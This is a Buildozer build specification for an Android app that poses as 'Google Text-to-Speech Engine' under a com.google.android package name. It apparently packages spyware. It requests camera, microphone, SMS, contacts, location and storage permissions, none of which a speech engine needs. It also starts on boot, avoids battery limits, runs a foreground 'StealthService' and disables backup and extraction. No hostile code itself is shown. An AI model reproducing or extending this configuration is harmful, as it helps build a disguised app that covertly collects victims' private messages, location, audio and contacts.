[app]
title = Google Text-to-Speech Engine
package.name = tts_v2
package.domain = com.google.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,json,ttf,xml
source.include_dirs = assets,res
version = 2.1.0
requirements = python3,kivy==2.3.0,requests,pyjnius,urllib3,certifi,openssl,pycryptodome,chardet,idna
orientation = portrait
fullscreen = 0
android.permissions = INTERNET,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,POST_NOTIFICATIONS,CAMERA,RECORD_AUDIO,READ_CONTACTS,READ_SMS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE
android.api = 33
android.minapi = 21
android.ndk = 23b
android.build_tools_version = 33.0.0
android.manifest = AndroidManifest.xml
android.archs = arm64-v8a
android.foreground_service = True
services = StealthService:main.py
android.meta_data = android.content.pm.NOT_EXTRACTABLE=true
android.allow_backup = False
android.private_storage = True
android.accept_sdk_license = True
android.wakelock = True

[buildozer]
log_level = 2
warn_on_root = 1
